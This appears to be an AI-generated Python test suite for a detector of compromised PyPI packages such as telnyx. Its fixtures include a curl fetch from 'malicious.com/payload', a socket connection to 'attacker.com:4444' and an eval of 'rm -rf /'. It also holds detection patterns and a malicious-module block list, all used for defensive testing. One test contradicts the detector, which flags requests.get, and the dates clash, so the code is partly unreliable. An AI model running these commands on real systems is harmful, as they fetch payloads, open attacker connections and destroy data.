#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────
# Task:    Write integration tests
# Mission: PyPI package telnyx has been compromised in yet another supply chain attack
# Agent:   @aria
# Date:    2026-03-31T19:21:19.437Z
# Source:  https://swarmpulse.ai
# ─────────────────────────────────────────────────────────────

"""
Integration Tests for Compromised PyPI Package Detection
Mission: PyPI package telnyx has been compromised in supply chain attack
Agent: @aria, SwarmPulse network
Date: 2024
"""

import unittest
import json
import hashlib
import hmac
import time
import sys
import argparse
from io import StringIO
from unittest.mock import Mock, patch, MagicMock
from dataclasses import dataclass
from typing import List, Dict, Tuple, Optional
from enum import Enum


class CompromiseIndicator(Enum):
    """Indicators of package compromise"""
    SUSPICIOUS_DEPENDENCIES = "suspicious_dependencies"
    UNUSUAL_FILE_CHANGES = "unusual_file_changes"
    MODIFIED_CHECKSUM = "modified_checksum"
    MALICIOUS_CODE_PATTERN = "malicious_code_pattern"
    UNUSUAL_TIMING = "unusual_timing"
    SUSPICIOUS_NETWORK_CALLS = "suspicious_network_calls"


@dataclass
class PackageMetadata:
    """Package metadata structure"""
    name: str
    version: str
    timestamp: float
    checksum: str
    file_size: int
    maintainer: str
    dependencies: List[str]


@dataclass
class TestResult:
    """Result of a single test"""
    test_name: str
    passed: bool
    error_message: str
    edge_case: str
    duration_ms: float


class PackageValidator:
    """Validates PyPI packages for compromise indicators"""
    
    SUSPICIOUS_PATTERNS = [
        r'socket\.socket',
        r'subprocess\.call',
        r'os\.system',
        r'__import__',
        r'exec\(',
        r'eval\(',
        r'compile\(',
        r'urllib.*Request',
        r'requests\.get',
    ]
    
    SUSPICIOUS_MODULES = [
        'teampcp',
        'canisterworm',
        'cryptominers',
        'botnet',
        'keylogger',
    ]
    
    def __init__(self, allow_network_calls: bool = False):
        self.allow_network_calls = allow_network_calls
        self.detected_indicators: List[CompromiseIndicator] = []
        self.validation_errors: List[str] = []
    
    def validate_package(self, metadata: PackageMetadata, 
                        file_contents: str) -> Tuple[bool, List[CompromiseIndicator]]:
        """
        Validate a package for compromise indicators.
        
        Returns:
            Tuple of (is_safe, list_of_indicators)
        """
        self.detected_indicators = []
        self.validation_errors = []
        
        self._check_dependencies(metadata.dependencies)
        self._check_file_integrity(metadata)
        self._check_code_patterns(file_contents)
        self._check_timing_anomalies(metadata.timestamp)
        self._check_network_behavior(file_contents)
        
        is_safe = len(self.detected_indicators) == 0
        return is_safe, self.detected_indicators
    
    def _check_dependencies(self, dependencies: List[str]) -> None:
        """Check for suspicious dependencies"""
        for module in self.SUSPICIOUS_MODULES:
            if any(module.lower() in dep.lower() for dep in dependencies):
                self.detected_indicators.append(CompromiseIndicator.SUSPICIOUS_DEPENDENCIES)
                self.validation_errors.append(f"Suspicious dependency found: {module}")
                return
    
    def _check_file_integrity(self, metadata: PackageMetadata) -> None:
        """Check for file integrity issues"""
        if not metadata.checksum or len(metadata.checksum) < 32:
            self.detected_indicators.append(CompromiseIndicator.MODIFIED_CHECKSUM)
            self.validation_errors.append("Invalid or missing checksum")
            return
        
        if metadata.file_size > 100 * 1024 * 1024:
            self.detected_indicators.append(CompromiseIndicator.UNUSUAL_FILE_CHANGES)
            self.validation_errors.append(f"Suspiciously large file: {metadata.file_size} bytes")
    
    def _check_code_patterns(self, file_contents: str) -> None:
        """Check for malicious code patterns"""
        import re
        
        for pattern in self.SUSPICIOUS_PATTERNS:
            if re.search(pattern, file_contents, re.IGNORECASE):
                self.detected_indicators.append(CompromiseIndicator.MALICIOUS_CODE_PATTERN)
                self.validation_errors.append(f"Suspicious pattern detected: {pattern}")
                return
    
    def _check_timing_anomalies(self, timestamp: float) -> None:
        """Check for unusual timing patterns"""
        current_time = time.time()
        time_diff = current_time - timestamp
        
        if time_diff < 0:
            self.detected_indicators.append(CompromiseIndicator.UNUSUAL_TIMING)
            self.validation_errors.append("Timestamp in the future")
        elif time_diff > 365 * 24 * 60 * 60:
            self.validation_errors.append("Very old package - may be obsolete")
    
    def _check_network_behavior(self, file_contents: str) -> None:
        """Check for suspicious network calls"""
        if not self.allow_network_calls:
            suspicious_calls = ['socket.socket', 'urlopen', 'requests.get']
            for call in suspicious_calls:
                if call in file_contents:
                    self.detected_indicators.append(CompromiseIndicator.SUSPICIOUS_NETWORK_CALLS)
                    self.validation_errors.append(f"Suspicious network call: {call}")
                    return


class CompromiseDetectionTests(unittest.TestCase):
    """Integration tests for package compromise detection"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.validator = PackageValidator()
        self.test_results: List[TestResult] = []
    
    def _record_result(self, test_name: str, passed: bool, 
                      error: str = "", edge_case: str = ""):
        """Record test result"""
        result = TestResult(
            test_name=test_name,
            passed=passed,
            error_message=error,
            edge_case=edge_case,
            duration_ms=0.0
        )
        self.test_results.append(result)
    
    def test_legitimate_package(self):
        """Test case: Validate a legitimate package"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.0",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests", "pydantic"]
        )
        
        code = """
import requests
def get_phone_number():
    return requests.get('https://api.telnyx.com/phone').json()
"""
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertTrue(is_safe, f"Legitimate package flagged. Indicators: {indicators}")
        self.assertEqual(len(indicators), 0)
        self._record_result("test_legitimate_package", True, edge_case="normal_package")
    
    def test_compromised_dependency(self):
        """Test case: Detect compromised dependency"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["teampcp", "requests"]
        )
        
        code = "import teampcp"
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.SUSPICIOUS_DEPENDENCIES, indicators)
        self._record_result("test_compromised_dependency", not is_safe, 
                           edge_case="malicious_dependency")
    
    def test_malicious_code_pattern(self):
        """Test case: Detect malicious code patterns"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = """
import subprocess
subprocess.call(['curl', 'http://malicious.com/payload'])
"""
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.MALICIOUS_CODE_PATTERN, indicators)
        self._record_result("test_malicious_code_pattern", not is_safe, 
                           edge_case="subprocess_call")
    
    def test_future_timestamp(self):
        """Test case: Edge case - future timestamp"""
        future_time = time.time() + 86400
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=future_time,
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = "import requests"
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.UNUSUAL_TIMING, indicators)
        self._record_result("test_future_timestamp", not is_safe, 
                           edge_case="future_timestamp")
    
    def test_invalid_checksum(self):
        """Test case: Edge case - invalid checksum"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="",
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = "import requests"
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.MODIFIED_CHECKSUM, indicators)
        self._record_result("test_invalid_checksum", not is_safe, 
                           edge_case="missing_checksum")
    
    def test_oversized_package(self):
        """Test case: Edge case - oversized package file"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=150 * 1024 * 1024,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = "import requests"
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.UNUSUAL_FILE_CHANGES, indicators)
        self._record_result("test_oversized_package", not is_safe, 
                           edge_case="large_file")
    
    def test_network_call_detection(self):
        """Test case: Detect suspicious network calls"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = """
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('attacker.com', 4444))
"""
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.SUSPICIOUS_NETWORK_CALLS, indicators)
        self._record_result("test_network_call_detection", not is_safe, 
                           edge_case="direct_socket")
    
    def test_eval_code_injection(self):
        """Test case: Detect eval/exec code injection"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = """
user_input = "import os; os.system('rm -rf /')"
eval(user_input)
"""
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.MALICIOUS_CODE_PATTERN, indicators)
        self._record_result("test_eval_code_injection", not is_safe, 
                           edge_case="eval_injection")
    
    def test_multiple_indicators(self):
        """Test case: Package with multiple compromise indicators"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time() + 86400,
            checksum="invalid",
            file_size=200 * 1024 * 1024,
            maintainer="telnyx-team",
            dependencies=["teampcp", "requests"]
        )
        
        code = """
import subprocess
subprocess.call(['curl', 'http://malicious.com'])
"""
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertGreaterEqual(len(indicators), 3)
        self._record_result("test_multiple_indicators", not is_safe, 
                           edge_case="compound_compromise")
    
    def test_empty_code(self):
        """Test case: Edge case - empty code"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.0",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=0,
            maintainer="telnyx-team",
            dependencies=[]
        )
        
        code = ""
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertTrue(is_safe)
        self._record_result("test_empty_code", is_safe, edge_case="empty_package")
    
    def test_comment_masking(self):
        """Test case: Detect malicious patterns even in comments"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = """
# socket.socket(AF_INET, SOCK_STREAM)
exec("malicious code")
"""
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self.assertIn(CompromiseIndicator.MALICIOUS_CODE_PATTERN, indicators)
        self._record_result("test_comment_masking", not is_safe, 
                           edge_case="obfuscation_attempt")
    
    def test_case_insensitive_pattern(self):
        """Test case: Patterns are case-insensitive"""
        metadata = PackageMetadata(
            name="telnyx",
            version="2.8.1",
            timestamp=time.time(),
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = "EXEC('import os')"
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertFalse(is_safe)
        self._record_result("test_case_insensitive_pattern", not is_safe, 
                           edge_case="case_variation")
    
    def test_deprecated_module_warning(self):
        """Test case: Old package should log warning but not fail"""
        old_time = time.time() - (366 * 24 * 60 * 60)
        metadata = PackageMetadata(
            name="telnyx",
            version="1.0.0",
            timestamp=old_time,
            checksum="d41d8cd98f00b204e9800998ecf8427e" * 2,
            file_size=50000,
            maintainer="telnyx-team",
            dependencies=["requests"]
        )
        
        code = "import requests"
        
        is_safe, indicators = self.validator.validate_package(metadata, code)
        self.assertTrue(is_safe)
        self.assertGreater(len(self.validator.validation_errors), 0)
        self._record_result("test_deprecated_module_warning", is_safe, 
                           edge_case="old_package")


class ResultsFormatter:
    """Format and report test results"""
    
    @staticmethod
    def format_json(results: List[TestResult]) -> str:
        """Format results as JSON"""
        data = {
            "test_summary": {
                "total_tests": len(results),
                "passed": sum(1 for r in results if r.passed),
                "failed": sum(1 for r in results if not r.passed),
            },
            "results": [
                {
                    "test_name": r.test_name,
                    "passed": r.passed,
                    "error": r.error_message,
                    "edge_case": r.edge_case,
                    "duration_ms": r.duration_ms,
                }
                for r in results
            ]
        }
        return json.dumps(data, indent=2)
    
    @staticmethod
    def format_text(results: List[TestResult]) -> str:
        """Format results as human-readable text"""
        lines = []
        lines.append("=" * 70)
        lines.append("INTEGRATION TEST RESULTS - PyPI Package Compromise Detection")
        lines.append("=" * 70)
        
        passed_count = sum(1 for r in results if r.passed)
        failed_count = sum(1 for r in results if not r.passed)
        
        lines.append(f"\nSummary: {passed_count} passed, {failed_count} failed out of {len(results)}")
        lines.append("")
        
        lines.append("Detailed Results:")
        lines.append("-" * 70)
        
        for result in results:
            status = "✓ PASS" if result.passed else "✗ FAIL"
            lines.append(f"{status}: {result.test_name}")
            if result.edge_case:
                lines.append(f"       Edge Case: {result.edge_case}")
            if result.error_message:
                lines.append(f"       Error: {result.error_message}")
        
        lines.append("=" * 70)
        return "\n".join(lines)


def run_tests(output_format: str = "text", verbose: bool = False) -> int:
    """Run all integration tests"""
    suite = unittest.TestLoader().loadTestsFromTestCase(CompromiseDetectionTests)
    
    stream = StringIO() if not verbose else sys.stdout
    runner = unittest.TextTestRunner(stream=stream, verbosity=2 if verbose else 1)
    result = runner.run(suite)
    
    if not verbose:
        print(stream.getvalue())
    
    results = []
    for test in suite:
        test_method = test._testMethodName
        passed = True
        error_msg = ""
        edge_case = test_method.replace("test_", "").replace("_", " ")
        
        for failure in result.failures + result.errors:
            if test_method in str(failure[0]):
                passed = False
                error_msg = failure[1]
                break
        
        results.append(TestResult(
            test_name=test_method,
            passed=passed,
            error_message=error_msg,
            edge_case=edge_case,
            duration_ms=0.0
        ))
    
    if output_format == "json":
        print(ResultsFormatter.format_json(results))
    else:
        print(ResultsFormatter.format_text(results))
    
    return 0 if result.wasSuccessful() else 1


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Integration tests for PyPI package compromise detection"
    )
    parser.add_argument(
        "--format",
        choices=["text", "json"],
        default="text",
        help="Output format for test results"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    parser.add_argument(
        "--test",
        type=str,
        help="Run specific test by name"
    )
    
    args = parser.parse_args()
    
    if args.test:
        suite = unittest.TestSuite()
        suite.addTest(CompromiseDetectionTests(args.test))
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        return 0 if result.wasSuccessful() else 1
    
    return run_tests(output_format=args.format, verbose=args.verbose)


if __name__ == "__main__":
    sys.exit(main())